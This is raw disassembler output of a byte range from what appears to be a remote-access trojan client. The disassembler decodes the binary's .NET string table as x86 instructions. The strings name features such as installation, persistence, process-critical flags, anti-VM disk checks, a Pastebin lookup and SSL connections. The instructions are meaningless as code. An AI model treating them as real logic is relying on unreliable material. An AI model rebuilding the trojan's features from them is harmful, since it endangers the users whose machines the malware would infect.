  406440:	65 73 73             	gs jae 0x4064b6
  406443:	61                   	popa
  406444:	67 65 50             	addr16 gs push %eax
  406447:	61                   	popa
  406448:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  40644b:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  406452:	61                   	popa
  406453:	67 65 50             	addr16 gs push %eax
  406456:	61                   	popa
  406457:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40645a:	4d                   	dec    %ebp
  40645b:	73 67                	jae    0x4064c4
  40645d:	50                   	push   %eax
  40645e:	61                   	popa
  40645f:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  406462:	41                   	inc    %ecx
  406463:	73 79                	jae    0x4064de
  406465:	6e                   	outsb  %ds:(%esi),(%dx)
  406466:	63 43 61             	arpl   %eax,0x61(%ebx)
  406469:	6c                   	insb   (%dx),%es:(%edi)
  40646a:	6c                   	insb   (%dx),%es:(%edi)
  40646b:	62 61 63             	bound  %esp,0x63(%ecx)
  40646e:	6b 00 52             	imul   $0x52,(%eax),%eax
  406471:	65 6d                	gs insl (%dx),%es:(%edi)
  406473:	6f                   	outsl  %ds:(%esi),(%dx)
  406474:	74 65                	je     0x4064db
  406476:	43                   	inc    %ebx
  406477:	65 72 74             	gs jb  0x4064ee
  40647a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406481:	56                   	push   %esi
  406482:	61                   	popa
  406483:	6c                   	insb   (%dx),%es:(%edi)
  406484:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40648b:	43 
  40648c:	61                   	popa
  40648d:	6c                   	insb   (%dx),%es:(%edi)
  40648e:	6c                   	insb   (%dx),%es:(%edi)
  40648f:	62 61 63             	bound  %esp,0x63(%ecx)
  406492:	6b 00 54             	imul   $0x54,(%eax),%eax
  406495:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  40649c:	6c                   	insb   (%dx),%es:(%edi)
  40649d:	62 61 63             	bound  %esp,0x63(%ecx)
  4064a0:	6b 00 75             	imul   $0x75,(%eax),%eax
  4064a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4064a4:	70 61                	jo     0x406507
  4064a6:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  4064a9:	6d                   	insl   (%dx),%es:(%edi)
  4064aa:	73 67                	jae    0x406513
  4064ac:	70 61                	jo     0x40650f
  4064ae:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4064b1:	52                   	push   %edx
  4064b2:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4064b9:	4b 65 
  4064bb:	79 50                	jns    0x40650d
  4064bd:	65 72 6d             	gs jb  0x40652d
  4064c0:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  4064c7:	68 65 63 6b 00       	push   $0x6b6365
  4064cc:	46                   	inc    %esi
  4064cd:	6c                   	insb   (%dx),%es:(%edi)
  4064ce:	75 73                	jne    0x406543
  4064d0:	68 46 69 6e 61       	push   $0x616e6946
  4064d5:	6c                   	insb   (%dx),%es:(%edi)
  4064d6:	42                   	inc    %edx
  4064d7:	6c                   	insb   (%dx),%es:(%edi)
  4064d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4064d9:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4064dc:	49                   	dec    %ecx
  4064dd:	73 53                	jae    0x406532
  4064df:	6d                   	insl   (%dx),%es:(%edi)
  4064e0:	61                   	popa
  4064e1:	6c                   	insb   (%dx),%es:(%edi)
  4064e2:	6c                   	insb   (%dx),%es:(%edi)
  4064e3:	44                   	inc    %esp
  4064e4:	69 73 6b 00 52 74 6c 	imul   $0x6c745200,0x6b(%ebx),%esi
  4064eb:	53                   	push   %ebx
  4064ec:	65 74 50             	gs je  0x40653f
  4064ef:	72 6f                	jb     0x406560
  4064f1:	63 65 73             	arpl   %esp,0x73(%ebp)
  4064f4:	73 49                	jae    0x40653f
  4064f6:	73 43                	jae    0x40653b
  4064f8:	72 69                	jb     0x406563
  4064fa:	74 69                	je     0x406565
  4064fc:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4064ff:	00 50 72             	add    %dl,0x72(%eax)
  406502:	6f                   	outsl  %ds:(%esi),(%dx)
  406503:	63 65 73             	arpl   %esp,0x73(%ebp)
  406506:	73 43                	jae    0x40654b
  406508:	72 69                	jb     0x406573
  40650a:	74 69                	je     0x406575
  40650c:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  40650f:	00 4e 65             	add    %cl,0x65(%esi)
  406512:	74 77                	je     0x40658b
  406514:	6f                   	outsl  %ds:(%esi),(%dx)
  406515:	72 6b                	jb     0x406582
  406517:	43                   	inc    %ebx
  406518:	72 65                	jb     0x40657f
  40651a:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  40651d:	74 69                	je     0x406588
  40651f:	61                   	popa
  406520:	6c                   	insb   (%dx),%es:(%edi)
  406521:	00 53 79             	add    %dl,0x79(%ebx)
  406524:	73 74                	jae    0x40659a
  406526:	65 6d                	gs insl (%dx),%es:(%edi)
  406528:	2e 53                	cs push %ebx
  40652a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40652e:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  406535:	6e 
  406536:	63 69 70             	arpl   %ebp,0x70(%ecx)
  406539:	61                   	popa
  40653a:	6c                   	insb   (%dx),%es:(%edi)
  40653b:	00 57 69             	add    %dl,0x69(%edi)
  40653e:	6e                   	outsb  %ds:(%esi),(%dx)
  40653f:	64 6f                	outsl  %fs:(%esi),(%dx)
  406541:	77 73                	ja     0x4065b6
  406543:	50                   	push   %eax
  406544:	72 69                	jb     0x4065af
  406546:	6e                   	outsb  %ds:(%esi),(%dx)
  406547:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40654a:	61                   	popa
  40654b:	6c                   	insb   (%dx),%es:(%edi)
  40654c:	00 41 72             	add    %al,0x72(%ecx)
  40654f:	65 45                	gs inc %ebp
  406551:	71 75                	jno    0x4065c8
  406553:	61                   	popa
  406554:	6c                   	insb   (%dx),%es:(%edi)
  406555:	00 67 65             	add    %ah,0x65(%edi)
  406558:	74 5f                	je     0x4065b9
  40655a:	49                   	dec    %ecx
  40655b:	6e                   	outsb  %ds:(%esi),(%dx)
  40655c:	74 65                	je     0x4065c3
  40655e:	72 76                	jb     0x4065d6
  406560:	61                   	popa
  406561:	6c                   	insb   (%dx),%es:(%edi)
  406562:	00 73 65             	add    %dh,0x65(%ebx)
  406565:	74 5f                	je     0x4065c6
  406567:	49                   	dec    %ecx
  406568:	6e                   	outsb  %ds:(%esi),(%dx)
  406569:	74 65                	je     0x4065d0
  40656b:	72 76                	jb     0x4065e3
  40656d:	61                   	popa
  40656e:	6c                   	insb   (%dx),%es:(%edi)
  40656f:	00 43 6c             	add    %al,0x6c(%ebx)
  406572:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  406579:	73 74                	jae    0x4065ef
  40657b:	61                   	popa
  40657c:	6c                   	insb   (%dx),%es:(%edi)
  40657d:	6c                   	insb   (%dx),%es:(%edi)
  40657e:	00 6b 65             	add    %ch,0x65(%ebx)
  406581:	72 6e                	jb     0x4065f1
  406583:	65 6c                	gs insb (%dx),%es:(%edi)
  406585:	33 32                	xor    (%edx),%esi
  406587:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40658a:	6c                   	insb   (%dx),%es:(%edi)
  40658b:	00 75 73             	add    %dh,0x73(%ebp)
  40658e:	65 72 33             	gs jb  0x4065c4
  406591:	32 2e                	xor    (%esi),%ch
  406593:	64 6c                	fs insb (%dx),%es:(%edi)
  406595:	6c                   	insb   (%dx),%es:(%edi)
  406596:	00 6e 74             	add    %ch,0x74(%esi)
  406599:	64 6c                	fs insb (%dx),%es:(%edi)
  40659b:	6c                   	insb   (%dx),%es:(%edi)
  40659c:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40659f:	6c                   	insb   (%dx),%es:(%edi)
  4065a0:	00 4b 69             	add    %cl,0x69(%ebx)
  4065a3:	6c                   	insb   (%dx),%es:(%edi)
  4065a4:	6c                   	insb   (%dx),%es:(%edi)
  4065a5:	00 50 6f             	add    %dl,0x6f(%eax)
  4065a8:	6c                   	insb   (%dx),%es:(%edi)
  4065a9:	6c                   	insb   (%dx),%es:(%edi)
  4065aa:	00 4d 75             	add    %cl,0x75(%ebp)
  4065ad:	74 65                	je     0x406614
  4065af:	78 43                	js     0x4065f4
  4065b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4065b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4065b3:	74 72                	je     0x406627
  4065b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4065b6:	6c                   	insb   (%dx),%es:(%edi)
  4065b7:	00 46 69             	add    %al,0x69(%esi)
  4065ba:	6c                   	insb   (%dx),%es:(%edi)
  4065bb:	65 53                	gs push %ebx
  4065bd:	74 72                	je     0x406631
  4065bf:	65 61                	gs popa
  4065c1:	6d                   	insl   (%dx),%es:(%edi)
  4065c2:	00 4e 65             	add    %cl,0x65(%esi)
  4065c5:	74 77                	je     0x40663e
  4065c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4065c8:	72 6b                	jb     0x406635
  4065ca:	53                   	push   %ebx
  4065cb:	74 72                	je     0x40663f
  4065cd:	65 61                	gs popa
  4065cf:	6d                   	insl   (%dx),%es:(%edi)
  4065d0:	00 53 73             	add    %dl,0x73(%ebx)
  4065d3:	6c                   	insb   (%dx),%es:(%edi)
  4065d4:	53                   	push   %ebx
  4065d5:	74 72                	je     0x406649
  4065d7:	65 61                	gs popa
  4065d9:	6d                   	insl   (%dx),%es:(%edi)
  4065da:	00 43 72             	add    %al,0x72(%ebx)
  4065dd:	79 70                	jns    0x40664f
  4065df:	74 6f                	je     0x406650
  4065e1:	53                   	push   %ebx
  4065e2:	74 72                	je     0x406656
  4065e4:	65 61                	gs popa
  4065e6:	6d                   	insl   (%dx),%es:(%edi)
  4065e7:	00 4d 65             	add    %cl,0x65(%ebp)
  4065ea:	6d                   	insl   (%dx),%es:(%edi)
  4065eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4065ec:	72 79                	jb     0x406667
  4065ee:	53                   	push   %ebx
  4065ef:	74 72                	je     0x406663
  4065f1:	65 61                	gs popa
  4065f3:	6d                   	insl   (%dx),%es:(%edi)
  4065f4:	00 50 72             	add    %dl,0x72(%eax)
  4065f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4065f8:	67 72 61             	addr16 jb 0x40665c
  4065fb:	6d                   	insl   (%dx),%es:(%edi)
  4065fc:	00 67 65             	add    %ah,0x65(%edi)
  4065ff:	74 5f                	je     0x406660
  406601:	49                   	dec    %ecx
  406602:	74 65                	je     0x406669
  406604:	6d                   	insl   (%dx),%es:(%edi)
  406605:	00 67 65             	add    %ah,0x65(%edi)
  406608:	74 5f                	je     0x406669
  40660a:	49                   	dec    %ecx
  40660b:	73 36                	jae    0x406643
  40660d:	34 42                	xor    $0x42,%al
  40660f:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  406616:	74 
  406617:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  40661e:	65 6d                	gs insl (%dx),%es:(%edi)
  406620:	00 43 6c             	add    %al,0x6c(%ebx)
  406623:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  40662a:	67 6f                	outsl  %ds:(%si),(%dx)
  40662c:	72 69                	jb     0x406697
  40662e:	74 68                	je     0x406698
  406630:	6d                   	insl   (%dx),%es:(%edi)
  406631:	00 53 79             	add    %dl,0x79(%ebx)
  406634:	6d                   	insl   (%dx),%es:(%edi)
  406635:	6d                   	insl   (%dx),%es:(%edi)
  406636:	65 74 72             	gs je  0x4066ab
  406639:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  406640:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  406647:	79 
  406648:	6d                   	insl   (%dx),%es:(%edi)
  406649:	6d                   	insl   (%dx),%es:(%edi)
  40664a:	65 74 72             	gs je  0x4066bf
  40664d:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  406654:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40665b:	73 
  40665c:	68 41 6c 67 6f       	push   $0x6f676c41
  406661:	72 69                	jb     0x4066cc
  406663:	74 68                	je     0x4066cd
  406665:	6d                   	insl   (%dx),%es:(%edi)
  406666:	00 52 61             	add    %dl,0x61(%edx)
  406669:	6e                   	outsb  %ds:(%esi),(%dx)
  40666a:	64 6f                	outsl  %fs:(%esi),(%dx)
  40666c:	6d                   	insl   (%dx),%es:(%edi)
  40666d:	00 49 43             	add    %cl,0x43(%ecx)
  406670:	72 79                	jb     0x4066eb
  406672:	70 74                	jo     0x4066e8
  406674:	6f                   	outsl  %ds:(%esi),(%dx)
  406675:	54                   	push   %esp
  406676:	72 61                	jb     0x4066d9
  406678:	6e                   	outsb  %ds:(%esi),(%dx)
  406679:	73 66                	jae    0x4066e1
  40667b:	6f                   	outsl  %ds:(%esi),(%dx)
  40667c:	72 6d                	jb     0x4066eb
  40667e:	00 45 6e             	add    %al,0x6e(%ebp)
  406681:	75 6d                	jne    0x4066f0
  406683:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  406687:	6f                   	outsl  %ds:(%esi),(%dx)
  406688:	6f                   	outsl  %ds:(%esi),(%dx)
  406689:	6c                   	insb   (%dx),%es:(%edi)
  40668a:	65 61                	gs popa
  40668c:	6e                   	outsb  %ds:(%esi),(%dx)
  40668d:	00 48 77             	add    %cl,0x77(%eax)
  406690:	69 64 47 65 6e 00 4d 	imul   $0x614d006e,0x65(%edi,%eax,2),%esp
  406697:	61 
  406698:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  40669f:	43                   	inc    %ebx
  4066a0:	68 61 69 6e 00       	push   $0x6e6961
  4066a5:	63 68 61             	arpl   %ebp,0x61(%eax)
  4066a8:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4066af:	6f                   	outsl  %ds:(%esi),(%dx)
  4066b0:	6d                   	insl   (%dx),%es:(%edi)
  4066b1:	61                   	popa
  4066b2:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4066b9:	43                   	inc    %ebx
  4066ba:	75 72                	jne    0x40672e
  4066bc:	72 65                	jb     0x406723
  4066be:	6e                   	outsb  %ds:(%esi),(%dx)
  4066bf:	74 44                	je     0x406705
  4066c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4066c2:	6d                   	insl   (%dx),%es:(%edi)
  4066c3:	61                   	popa
  4066c4:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4066cb:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4066cf:	00 49 73             	add    %cl,0x73(%ecx)
  4066d2:	41                   	inc    %ecx
  4066d3:	64 6d                	fs insl (%dx),%es:(%edi)
  4066d5:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4066dc:	00 47 65             	add    %al,0x65(%edi)
  4066df:	74 46                	je     0x406727
  4066e1:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  4066e8:	57 
  4066e9:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  4066f0:	78 
  4066f1:	74 65                	je     0x406758
  4066f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4066f4:	73 69                	jae    0x40675f
  4066f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4066f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4066f8:	00 67 65             	add    %ah,0x65(%edi)
  4066fb:	74 5f                	je     0x40675c
  4066fd:	4f                   	dec    %edi
  4066fe:	53                   	push   %ebx
  4066ff:	56                   	push   %esi
  406700:	65 72 73             	gs jb  0x406776
  406703:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  40670a:	6c                   	insb   (%dx),%es:(%edi)
  40670b:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  406712:	00 53 79             	add    %dl,0x79(%ebx)
  406715:	73 74                	jae    0x40678b
  406717:	65 6d                	gs insl (%dx),%es:(%edi)
  406719:	2e 53                	cs push %ebx
  40671b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40671f:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  406726:	68 
  406727:	65 6e                	outsb  %gs:(%esi),(%dx)
  406729:	74 69                	je     0x406794
  40672b:	63 61 74             	arpl   %esp,0x74(%ecx)
  40672e:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  406735:	74 65                	je     0x40679c
  406737:	6d                   	insl   (%dx),%es:(%edi)
  406738:	2e 52                	cs push %edx
  40673a:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40673d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406742:	6e                   	outsb  %ds:(%esi),(%dx)
  406743:	00 58 35             	add    %bl,0x35(%eax)
  406746:	30 39                	xor    %bh,(%ecx)
  406748:	43                   	inc    %ebx
  406749:	65 72 74             	gs jb  0x4067c0
  40674c:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406753:	43                   	inc    %ebx
  406754:	6f                   	outsl  %ds:(%esi),(%dx)
  406755:	6c                   	insb   (%dx),%es:(%edi)
  406756:	6c                   	insb   (%dx),%es:(%edi)
  406757:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40675c:	6e                   	outsb  %ds:(%esi),(%dx)
  40675d:	00 4d 61             	add    %cl,0x61(%ebp)
  406760:	6e                   	outsb  %ds:(%esi),(%dx)
  406761:	61                   	popa
  406762:	67 65 6d             	gs insl (%dx),%es:(%di)
  406765:	65 6e                	outsb  %gs:(%esi),(%dx)
  406767:	74 4f                	je     0x4067b8
  406769:	62 6a 65             	bound  %ebp,0x65(%edx)
  40676c:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  406770:	6c                   	insb   (%dx),%es:(%edi)
  406771:	6c                   	insb   (%dx),%es:(%edi)
  406772:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406777:	6e                   	outsb  %ds:(%esi),(%dx)
  406778:	00 43 6c             	add    %al,0x6c(%ebx)
  40677b:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  406782:	6e                   	outsb  %ds:(%esi),(%dx)
  406783:	6e                   	outsb  %ds:(%esi),(%dx)
  406784:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406789:	6e                   	outsb  %ds:(%esi),(%dx)
  40678a:	00 73 65             	add    %dh,0x65(%ebx)
  40678d:	74 5f                	je     0x4067ee
  40678f:	50                   	push   %eax
  406790:	6f                   	outsl  %ds:(%esi),(%dx)
  406791:	73 69                	jae    0x4067fc
  406793:	74 69                	je     0x4067fe
  406795:	6f                   	outsl  %ds:(%esi),(%dx)
  406796:	6e                   	outsb  %ds:(%esi),(%dx)
  406797:	00 43 72             	add    %al,0x72(%ebx)
  40679a:	79 70                	jns    0x40680c
  40679c:	74 6f                	je     0x40680d
  40679e:	67 72 61             	addr16 jb 0x406802
  4067a1:	70 68                	jo     0x40680b
  4067a3:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4067aa:	74 69                	je     0x406815
  4067ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4067ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4067ae:	00 41 72             	add    %al,0x72(%ecx)
  4067b1:	67 75 6d             	addr16 jne 0x406821
  4067b4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067b6:	74 4e                	je     0x406806
  4067b8:	75 6c                	jne    0x406826
  4067ba:	6c                   	insb   (%dx),%es:(%edi)
  4067bb:	45                   	inc    %ebp
  4067bc:	78 63                	js     0x406821
  4067be:	65 70 74             	gs jo  0x406835
  4067c1:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  4067c8:	75 6d                	jne    0x406837
  4067ca:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067cc:	74 45                	je     0x406813
  4067ce:	78 63                	js     0x406833
  4067d0:	65 70 74             	gs jo  0x406847
  4067d3:	69 6f 6e 00 49 6d 61 	imul   $0x616d4900,0x6e(%edi),%ebp
  4067da:	67 65 43             	addr16 gs inc %ebx
  4067dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4067de:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  4067e3:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067e5:	00 53 65             	add    %dl,0x65(%ebx)
  4067e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4067e9:	64 49                	fs dec %ecx
  4067eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4067ec:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067ee:	00 46 69             	add    %al,0x69(%esi)
  4067f1:	6c                   	insb   (%dx),%es:(%edi)
  4067f2:	65 49                	gs dec %ecx
  4067f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4067f5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067f7:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4067fb:	76 65                	jbe    0x406862
  4067fd:	49                   	dec    %ecx
  4067fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4067ff:	66 6f                	outsw  %ds:(%esi),(%dx)
  406801:	00 46 69             	add    %al,0x69(%esi)
  406804:	6c                   	insb   (%dx),%es:(%edi)
  406805:	65 53                	gs push %ebx
  406807:	79 73                	jns    0x40687c
  406809:	74 65                	je     0x406870
  40680b:	6d                   	insl   (%dx),%es:(%edi)
  40680c:	49                   	dec    %ecx
  40680d:	6e                   	outsb  %ds:(%esi),(%dx)
  40680e:	66 6f                	outsw  %ds:(%esi),(%dx)
  406810:	00 43 6f             	add    %al,0x6f(%ebx)
  406813:	6d                   	insl   (%dx),%es:(%edi)
  406814:	70 75                	jo     0x40688b
  406816:	74 65                	je     0x40687d
  406818:	72 49                	jb     0x406863
  40681a:	6e                   	outsb  %ds:(%esi),(%dx)
  40681b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40681d:	00 43 53             	add    %al,0x53(%ebx)
  406820:	68 61 72 70 41       	push   $0x41707261
  406825:	72 67                	jb     0x40688e
  406827:	75 6d                	jne    0x406896
  406829:	65 6e                	outsb  %gs:(%esi),(%dx)
  40682b:	74 49                	je     0x406876
  40682d:	6e                   	outsb  %ds:(%esi),(%dx)
  40682e:	66 6f                	outsw  %ds:(%esi),(%dx)
  406830:	00 50 72             	add    %dl,0x72(%eax)
  406833:	6f                   	outsl  %ds:(%esi),(%dx)
  406834:	63 65 73             	arpl   %esp,0x73(%ebp)
  406837:	73 53                	jae    0x40688c
  406839:	74 61                	je     0x40689c
  40683b:	72 74                	jb     0x4068b1
  40683d:	49                   	dec    %ecx
  40683e:	6e                   	outsb  %ds:(%esi),(%dx)
  40683f:	66 6f                	outsw  %ds:(%esi),(%dx)
  406841:	00 50 72             	add    %dl,0x72(%eax)
  406844:	65 76 65             	gs jbe 0x4068ac
  406847:	6e                   	outsb  %ds:(%esi),(%dx)
  406848:	74 53                	je     0x40689d
  40684a:	6c                   	insb   (%dx),%es:(%edi)
  40684b:	65 65 70 00          	gs gs jo 0x40684f
  40684f:	5a                   	pop    %edx
  406850:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  406857:	65 6e                	outsb  %gs:(%esi),(%dx)
  406859:	74 41                	je     0x40689c
  40685b:	70 70                	jo     0x4068cd
  40685d:	00 4d 69             	add    %cl,0x69(%ebp)
  406860:	63 72 6f             	arpl   %esi,0x6f(%edx)
  406863:	73 6f                	jae    0x4068d4
  406865:	66 74 2e             	data16 je 0x406896
  406868:	43                   	inc    %ebx
  406869:	53                   	push   %ebx
  40686a:	68 61 72 70 00       	push   $0x707261
  40686f:	47                   	inc    %edi
  406870:	72 6f                	jb     0x4068e1
  406872:	75 70                	jne    0x4068e4
  406874:	00 4e 6f             	add    %cl,0x6f(%esi)
  406877:	72 6d                	jb     0x4068e6
  406879:	61                   	popa
  40687a:	6c                   	insb   (%dx),%es:(%edi)
  40687b:	53                   	push   %ebx
  40687c:	74 61                	je     0x4068df
  40687e:	72 74                	jb     0x4068f4
  406880:	75 70                	jne    0x4068f2
  406882:	00 53 79             	add    %dl,0x79(%ebx)
  406885:	73 74                	jae    0x4068fb
  406887:	65 6d                	gs insl (%dx),%es:(%edi)
  406889:	2e 4c                	cs dec %esp
  40688b:	69 6e 71 00 43 68 61 	imul   $0x61684300,0x71(%esi),%ebp
  406892:	72 00                	jb     0x406894
  406894:	49                   	dec    %ecx
  406895:	6e                   	outsb  %ds:(%esi),(%dx)
  406896:	76 6f                	jbe    0x406907
  406898:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  40689c:	6d                   	insl   (%dx),%es:(%edi)
  40689d:	62 65 72             	bound  %esp,0x72(%ebp)
  4068a0:	00 4d 44             	add    %cl,0x44(%ebp)
  4068a3:	35 43 72 79 70       	xor    $0x70797243,%eax
  4068a8:	74 6f                	je     0x406919
  4068aa:	53                   	push   %ebx
  4068ab:	65 72 76             	gs jb  0x406924
  4068ae:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4068b5:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  4068bc:	41 
  4068bd:	43                   	inc    %ebx
  4068be:	72 79                	jb     0x406939
  4068c0:	70 74                	jo     0x406936
  4068c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4068c3:	53                   	push   %ebx
  4068c4:	65 72 76             	gs jb  0x40693d
  4068c7:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4068ce:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4068d5:	73 
  4068d6:	43                   	inc    %ebx
  4068d7:	72 79                	jb     0x406952
  4068d9:	70 74                	jo     0x40694f
  4068db:	6f                   	outsl  %ds:(%esi),(%dx)
  4068dc:	53                   	push   %ebx
  4068dd:	65 72 76             	gs jb  0x406956
  4068e0:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4068e7:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4068ee:	72 
  4068ef:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4068f6:	64 65 72 00          	fs gs jb 0x4068fa
  4068fa:	49                   	dec    %ecx
  4068fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4068fc:	73 74                	jae    0x406972
  4068fe:	61                   	popa
  4068ff:	6c                   	insb   (%dx),%es:(%edi)
  406900:	6c                   	insb   (%dx),%es:(%edi)
  406901:	46                   	inc    %esi
  406902:	6f                   	outsl  %ds:(%esi),(%dx)
  406903:	6c                   	insb   (%dx),%es:(%edi)
  406904:	64 65 72 00          	fs gs jb 0x406908
  406908:	49                   	dec    %ecx
  406909:	64 53                	fs push %ebx
  40690b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40690d:	64 65 72 00          	fs gs jb 0x406911
  406911:	73 65                	jae    0x406978
  406913:	6e                   	outsb  %ds:(%esi),(%dx)
  406914:	64 65 72 00          	fs gs jb 0x406918
  406918:	4d                   	dec    %ebp
  406919:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  406920:	74 2e                	je     0x406950
  406922:	43                   	inc    %ebx
  406923:	53                   	push   %ebx
  406924:	68 61 72 70 2e       	push   $0x2e707261
  406929:	52                   	push   %edx
  40692a:	75 6e                	jne    0x40699a
  40692c:	74 69                	je     0x406997
  40692e:	6d                   	insl   (%dx),%es:(%edi)
  40692f:	65 42                	gs inc %edx
  406931:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  406938:	61                   	popa
  406939:	6c                   	insb   (%dx),%es:(%edi)
  40693a:	6c                   	insb   (%dx),%es:(%edi)
  40693b:	53                   	push   %ebx
  40693c:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  406943:	65 
  406944:	72 00                	jb     0x406946
  406946:	47                   	inc    %edi
  406947:	65 74 45             	gs je  0x40698f
  40694a:	6e                   	outsb  %ds:(%esi),(%dx)
  40694b:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40694e:	65 72 00             	gs jb  0x406951
  406951:	67 65 74 5f          	addr16 gs je 0x4069b4
  406955:	42                   	inc    %edx
  406956:	75 66                	jne    0x4069be
  406958:	66 65 72 00          	data16 gs jb 0x40695c
  40695c:	73 65                	jae    0x4069c3
  40695e:	74 5f                	je     0x4069bf
  406960:	42                   	inc    %edx
  406961:	75 66                	jne    0x4069c9
  406963:	66 65 72 00          	data16 gs jb 0x406967
  406967:	53                   	push   %ebx
  406968:	65 74 41             	gs je  0x4069ac
  40696b:	73 49                	jae    0x4069b6
